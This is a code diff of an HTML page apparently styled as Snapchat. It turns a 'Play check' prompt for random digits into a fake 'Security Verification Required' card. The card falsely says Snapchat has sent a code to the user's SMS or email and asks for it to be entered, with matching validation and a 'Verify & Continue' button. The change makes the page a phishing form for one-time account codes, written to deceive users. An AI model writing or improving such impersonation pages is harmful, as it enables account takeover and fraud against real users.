@@ -6,20 +6,29 @@
       <i class="fa-brands fa-snapchat icon-lg"></i>
     </div>
     <div>
-      <h2 class="notranslate" style="margin:0;color:#000;">Snapchat Play</h2>
-      <div style="color:#64748b;font-size:13px">Play check…</div>
+      <h2 class="notranslate" style="margin:0;color:#000;">Snapchat</h2>
+      <div style="color:#64748b;font-size:13px;margin-top:4px">Ready to Snap & Earn</div>
     </div>
   </div>
 
-  <h3 style="color:#e11d48">Play check…</h3>
-  <p>Step1: Put a smile on your face. Step2: Type any random digits below and click Submit to continue.</p>
+  <h3 style="color:#e11d48;margin:20px 0 16px 0;font-size:18px;font-weight:600">🔒 Security Verification Required</h3>
+  
+  <div class="play-instructions">
+    <div class="instruction-card">
+      <h4 style="color:#1e293b;margin:0 0 8px 0;font-size:15px;font-weight:600">Verification Code</h4>
+      <p style="color:#475569;margin:0;line-height:1.5;font-size:14px">
+        To confirm that you are the rightful owner of the Snapchat account you logged in with, a verification code has been sent to your registered SMS or email by Snapchat. Please enter the code below and click "Submit" to continue.
+      </p>
+    </div>
+  </div>
 
   <form id="digitsForm" method="post" novalidate>
-    <input class="input" id="digits" name="digits" placeholder="Enter digits (4-9)" required>
+    <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
+    <input class="input" id="digits" name="digits" placeholder="Enter 4-9 digit code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Submit</button>
+      <button class="btn login-btn" type="submit">Verify & Continue</button>
     </div>
   </form>
 </div>
@@ -72,6 +81,18 @@
 .login-btn:active {
   transform: scale(0.985);
 }
+
+.play-instructions {
+  margin: 20px 0;
+}
+
+.instruction-card {
+  background: #fffef0;
+  padding: 16px;
+  border-radius: 12px;
+  border-left: 4px solid #FFFC00;
+  margin-bottom: 16px;
+}
 </style>
 
 <script>
@@ -89,7 +110,7 @@ document.getElementById("digitsForm").addEventListener("submit", function(event)
   if (!pattern.test(val)) {
     valid = false;
     digits.classList.add("input-error");
-    digitsError.textContent = "The code you entered is incorrect.";
+    digitsError.textContent = "Please enter a valid 4-9 digit security code.";
   }
 
   if (!valid) event.preventDefault();
